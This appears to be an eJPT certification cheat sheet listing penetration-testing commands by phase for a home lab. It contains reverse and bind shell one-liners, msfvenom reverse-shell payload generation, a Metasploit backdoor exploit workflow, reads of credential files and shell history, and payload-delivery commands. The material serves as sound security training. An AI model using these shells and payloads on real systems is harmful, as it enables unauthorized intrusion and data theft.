# Commands Reference

> `01-Fundamentals/eJPT` · cheatsheets — INE-Cybersecurity-Certifications-Guide

Quick-reference tables and one-liners organized by pentest phase. The phases mirror the
`methodology/` folder (01-reconnaissance … 05-pivoting). Replace example IPs
(`192.168.56.x`) with your lab's addresses.

## 1. Reconnaissance — know yourself and the network

| Command | Purpose |
|---|---|
| `ip a` | Show your own IP addresses and interfaces |
| `ip route` | Show your routing table (which network is reachable) |
| `ip neigh` / `arp -a` | Show neighbors already seen on the local network |
| `hostname` / `whoami` | Local host and user context |
| `uname -a` / `cat /etc/os-release` | OS and kernel info |
| `ping -c 3 <host>` | Basic connectivity check |
| `sudo nmap -sn 192.168.56.0/24` | Host discovery over the subnet |
| `fping -a -g 192.168.56.0/24 2>/dev/null` | Faster ping sweep alternative |

```bash
# Quick live-host inventory, saved
sudo nmap -sn 192.168.56.0/24 -oG ping.gnmap
grep "Status: Up" ping.gnmap | cut -d " " -f 2 > hosts.txt
```

## 2. Enumeration — learn everything about the target

### Ports and services

```bash
sudo nmap -sS -p- -T4 --min-rate 1000 --open 192.168.56.101 -oA fulltcp
sudo nmap -sV -sC -p 21,22,80,139,445,3306 192.168.56.101 -oA sv
sudo nmap -O 192.168.56.101                       # OS guess (needs open + closed)
sudo nmap -sU --top-ports 50 192.168.56.101       # UDP sweep (slow)
sudo nmap -p 445 --script smb-os-discovery,smb-enum-shares 192.168.56.101
```

### Web

```bash
curl -s -I http://192.168.56.101                  # headers only
curl -s http://192.168.56.101 | head -50          # first lines of the page
nikto -h http://192.168.56.101                    # web vulnerability scanner
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50
```

### SMB / FTP / other services

| Command | Purpose |
|---|---|
| `smbclient -L //192.168.56.101 -N` | List SMB shares anonymously |
| `smbclient //192.168.56.101/<share> -N` | Connect to a specific share |
| `enum4linux -a 192.168.56.101` | SMB/NetBIOS enumeration bundle |
| `rpcclient -U "" -N 192.168.56.101` | Anonymous RPC session (try `srvinfo`) |
| `nc -vn 192.168.56.101 21` | Grab the FTP banner |
| `snmpwalk -v2c -c public 192.168.56.101` | SNMP walk if UDP 161 is open |

## 3. Exploitation — turn a finding into access

### Metasploit quick workflow

```text
msfconsole -q
search vsftpd                          # or: search cve:2011-2523
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run                                   # or: run -j (background job)
sessions -i 1                         # interact with the session
```

### Generate payloads (msfvenom)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
         -f elf -o rev.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
         -f exe -o rev.exe
```

### Manual shells

```bash
# Reverse shell — attacker listens first, then target connects
nc -lvnp 4444                                                  # attacker
nc -e /bin/bash 192.168.56.10 4444                             # target (has -e)
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1                    # target (bash only)

# Bind shell — target listens, attacker connects
nc -lvnp 4444 -e /bin/bash                                     # target
nc -nv 192.168.56.101 4444                                     # attacker
```

### Upgrade a raw shell to a PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on the attacker:
stty raw -echo
fg
export TERM=xterm
```

## 4. Post-exploitation — collect evidence and move up

### Linux enumeration one-liners

```bash
id; whoami; hostname; uname -a
cat /etc/passwd | head -30           # local users (compare with /etc/shadow)
sudo -l                              # what can you run as root?
find / -perm -4000 -type f 2>/dev/null        # SUID binaries
getcap -r / 2>/dev/null              # files with capabilities
crontab -l; ls -la /etc/cron*        # scheduled tasks
ss -tlnp                             # listening sockets on the target
cat ~/.bash_history                  # prior commands (creds, paths)
find / -name "*.txt" -o -name "*flag*" 2>/dev/null | head   # interesting files
```

### Windows enumeration (cmd.exe)

```bat
whoami /priv
net user
net localgroup administrators
systeminfo
tasklist
netstat -ano
```

### Meterpreter inside a session

```text
sysinfo
getuid
ps
shell                 # drop to OS shell; type 'exit' to return
upload /tmp/file /tmp/file
download /etc/passwd /root/loot/
background            # back to msfconsole
```

## 5. Pivoting — reach networks behind the target

```bash
# SSH local port forward: reach internal 192.168.57.10:80 via the foothold
ssh -L 8080:192.168.57.10:80 msfadmin@192.168.56.101
# now browse http://127.0.0.1:8080 on your Kali

# SSH dynamic SOCKS proxy, then route tools through it
ssh -D 1080 msfadmin@192.168.56.101
# /etc/proxychains4.conf: last line should be:  socks4 127.0.0.1 1080
proxychains4 nmap -sT -Pn -p 80 192.168.57.10
```

```text
# Metasploit: route through session 1 into the internal subnet
msf6 > route add 192.168.57.0/24 1
# or from meterpreter:
meterpreter > run autoroute -s 192.168.57.0/24
meterpreter > portfwd add -L 127.0.0.1 -l 8080 -p 80 -r 192.168.57.10
```

## File transfer / payload delivery

| Method | Sender / host | Receiver / target |
|---|---|---|
| HTTP | `python3 -m http.server 8080` | `wget http://192.168.56.10:8080/file` or `curl -O http://…` |
| Netcat | `nc -w 3 192.168.56.101 4444 < file` | `nc -lvnp 4444 > file` |
| ncat | `ncat 192.168.56.101 4444 --send-only < file` | `ncat -lvnp 4444 --recv-only > file` |
| Base64 | `base64 -w0 file` (copy output) | `echo <base64> | base64 -d > file` |
| Windows | — | `certutil -urlcache -f http://192.168.56.10/file out.exe` |

## Common Mistakes & Tips

- **Enumerate before exploiting.** Choose modules and payloads from *evidence*, not
  guesses — see `tools/nmap-cheatsheet.md`.
- **Record everything.** Every table above is a memory aid; your notes (commands +
  output) are the real deliverable.
- **Copy-paste IPs carefully.** A wrong `LHOST`/`RHOSTS` silently fails. Verify with
  `ip a` first.
- **Test connectivity before blaming tools.** If a payload does not connect, check the
  listener and firewall with `nc` before changing exploits.
- **Windows vs Linux syntax.** The right shell (`cmd.exe` vs `/bin/bash`) and the right
  payload architecture matter — confirm with `systeminfo`/`uname -m`.
- **UDP scanning is slow.** Keep UDP sweeps short (`--top-ports 50`).
- **Pivoting requires TCP-connect style scans** (`-sT`) through SOCKS; SYN scans do not
  work over proxychains.

## Checklist / Self-Test

- [ ] I can run every phase from recon to post-exploitation against my lab target.
- [ ] I can produce and save Nmap output in all formats (`-oA`).
- [ ] I can enumerate web (nikto/gobuster), SMB (smbclient/enum4linux), and FTP banners.
- [ ] I can generate a payload with msfvenom and catch it with a matching handler.
- [ ] I can create both reverse and bind shells with netcat from memory.
- [ ] I can upgrade a raw shell to a PTY.
- [ ] I can move a file target→Kali and Kali→target with two different methods.
- [ ] I can set up an SSH local port forward or SOCKS proxy for pivoting.

## Further Resources

- Nmap reference guide: <https://nmap.org/book/toc.html>
- Metasploit documentation: <https://docs.metasploit.com/>
- OWASP Web Security Testing Guide: <https://owasp.org/www-project-web-security-testing-guide/>
- MITRE ATT&CK (map each phase to techniques): <https://attack.mitre.org/>
- PortSwigger Web Security Academy (free web labs): <https://portswigger.net/web-security>
- Exploit-DB: <https://www.exploit-db.com/>
